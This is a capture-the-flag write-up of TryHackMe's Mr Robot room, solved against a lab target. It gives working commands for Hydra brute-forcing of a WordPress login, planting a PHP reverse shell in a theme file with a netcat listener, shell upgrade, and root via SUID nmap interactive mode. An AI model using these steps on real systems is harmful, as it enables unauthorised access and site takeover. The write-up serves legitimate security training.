# Mr Robot CTF Write up
As per any CTF on Tryhackme make sure everything is up and running and the target system is booted 

For this write up I will be using an attack box provided by Tryhackme however you can use your own machine if you want using OpenVPN (documentation on how to setup OVPN can be found on Tryhackme's beginners room)

**[Upon finishing this CTF you will be awarded the Mr Robot CTF badge](https://tryhackme.com/UwUtisum/badges/mr-robot)**
## Recon:
as per any pen testing challenge we will start by doing some basic recon on the site  
to start I ran a simple nmap scan to see what services are running on the host
Nmap command used:

    nmap -v [TARGET IP]

![Nmap Scan](https://femboy.beauty/WW5xc.png)

as you can see above we have 3 services running on the host machine 

 - Port: 22 SSH Server
 - Port: 80 HTTP Service
 - Port: 443 HTTPS Service

when visiting the site attached to the target machine you will be greeted by a very nice looking terminal based website i will leave this part to you as this was very fun to poke around with its many commands 
![MR robot website](https://femboy.beauty/HOSuq.png)

next we will run a go buster scan on the site attached to the target server to find any hidden directory's 
Go buster command:

    gobuster dir -u http://[TARGET IP]:80 -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt
This command is a little over kill as this word list is more in-depth than others however it will make sure we get a better picture of all the directory's within the site, ***this command may take a while to finish***

Below is the results from the gobuster scan:
![go buster scan](https://femboy.beauty/2Vhmp.png)

Using this information we can see that the website is a WordPress site, this is clear by the directory's 
**/wp-admin** and **/wp-content** another thing we can notice is the presence of a **robots file** some times this file can hold content the owner might not want being public 

contents of the robots file:

![robots file](https://femboy.beauty/OslNi.png)

**PERFECT!!** we can now see that we have found key 1 of 3 all we need to do now is open the file
![key1](https://femboy.beauty/afo3P.png)

Also listed in the Robots file is a **fsocity.dic** file
lets have a look at that also,
when going to the link **[TARGET IP]/fsocity.dic** it downloads the file to our PC opening this file will show us what seems to be a word list over 850k lines big<br>
![fsocity.dic pic](https://femboy.beauty/P7NAh.png)
## Exploitation:
**now the fun part x3**
first observation is the name **Elliot** in the **Fsocity.dic** file when entering this into our word press login page that we found from our gobuster search it informs us that it is a username used by the site
![Observations](https://femboy.beauty/MunTb.png)
However the **Fsocity.dic** file has many duplicate entry's so before we can progress we need to cut down the list and remove the duplicates to do this we will run the command below:

    sort fsocity.dic | uniq -d > wrd-list && sort fsocity.dic | uniq -u >> wrd-list
this will make a new file called **wrd-list** we will use this file instead of **fsocity.dic** from now on
 
before we can use **Hydra** we will need to figure out what type of request we will need to send to the word press site to brute force the password
to do this we will use **burp suite**
when loading up **burp suite** make sure to start a temporary project
![burp suite temp project](https://femboy.beauty/tlIGt.png)

and then navigate to the **Proxys tab** make sure intercept is on and open the browser
![Burp suite proxy](https://femboy.beauty/QaHMe.png)
Next we will need to navigate to the link **http://[TARGET IP]/wp-login.php** in the burp browser while making sure to click the forward button in burp suite to manually forward requests so the page loads

When entering the user name **Elliot** with a random password burp suite will find the type of request the client sends to the word press server
![capturing request](https://femboy.beauty/5r5oT.png)

with this knowledge we can use **Hydra** to use the **wrd-list** as a word list to try for a password, the reason we are doing this is due to the large size of the file **wrd-list**
we can do this by running the command: 

    hydra -l elliot -P wrd-list [TARGET IP] http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:F=The password you entered for the username" -t 30
    
 **BINGO** we have Elliots wordpress password 
 ![Hydra output](https://femboy.beauty/5d_1G.png)
Now using his word press password we can login to the admin portal for the site located at **http://[TARGET IP]/wp-login.php**

When we login we will be greeted by this wordpress portal
![wordpress dashboard](https://femboy.beauty/fokny.png)
## deploying a backdoor on the site

we will be using a **reverse shell** on the site to get access to the ssh server attached to the host machine 
first we will need to find a page that we will use to initialise our reverse shell to do this we navigate to the appearance tab and select editor 
![wp themes](https://femboy.beauty/PpXgm.png)
next we will need a reverse shell script I will be using [this one](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php) 
now we just enter the script into the editor in the wordpress admin portal like so
![enter image description here](https://femboy.beauty/cVnay.png)
**MAKE SURE YOU ENTER THE SCRIPT INTO ARCHIVES.PHP**
in the script there are these 2 lines near the top:

    $ip = '127.0.0.1';  // CHANGE THIS
    $port = 1234;       // CHANGE THIS
I will be changeing the port to 8080 and we will need to change the IP above to the IP of **your attack box** 
   now that we have done that we click update file
   on the attackbox open a new terminal and run the command below:
   

    nc -lnvp 8080
    
   this will listen on port 1234 for any incoming connections, to invoke a connection all we do is navigate to **http://[TARGET IP]/wp-content/themes/twentyfifteen/archive.php** 
[Video of Reverse Shell working](https://femboy.beauty/Ooypc.mp4)

now that we are in we can do some searching on the host server for goodies :3
to start with I checked what was in the directory I booted into using the command **ls** next I checked what was in the home directory and found there was a folder called **robot**
![enter image description here](https://femboy.beauty/_zmhx.png)

next when i was in home/robot we find a few files of interest

![enter image description here](https://femboy.beauty/jGFWO.png)

and boom we have found key 2 of 3 to view its contents we would use cat how ever we lack permissions to open the file
![enter image description here](https://femboy.beauty/xXBP4.png) 

next lets try to read the contents of the password.raw-md5 file
![enter image description here](https://femboy.beauty/Emcef.png)

Perfect now we have a hashed password for the robot user
to decrypt this hash I used [hashes.com](https://hashes.com/en/decrypt/hash)

![enter image description here](https://femboy.beauty/dje3f.png)

this gives us the password of **abcdefghijklmnopqrstuvwxyz**

next we try to run su robot to try and login to the robot user how ever we can only run su in a terminal

![enter image description here](https://femboy.beauty/Fyo50.png)

to fix this all we need to do is run the python command below to force us into a terminal on the host 

    python -c 'import pty;pty.spawn("/bin/bash")'
now we have a full terminal on the host machine now to login to robot
and view the content of the second key 

![enter image description here](https://femboy.beauty/fM6dk.png)

Next we will need to escalate our privileges to root 
next we will check for  **SUID files** using the command below:

    find / -perm -u=s -type f 2>/dev/null
  
  ![enter image description here](https://femboy.beauty/bI6gW.png)
  
as we can see here is all the file paths that have special permissions odly enough Nmap is listed above 
as weird is it sounds we will use Nmap to escalate our privileges to root 
all we need to do is open the nmap directory and boot nmap (yes it is that simple lol)
to get root i ran the commands below:

    cd /usr/local/bin/nmap --interactive 
    !sh
    whoami
    

![enter image description here](https://femboy.beauty/jMi9I.png)

Now that we are root we can CD into the root directory and find our 3rd and final key :D

![enter image description here](https://femboy.beauty/97ad2.png)

and just like that we have our last key x3
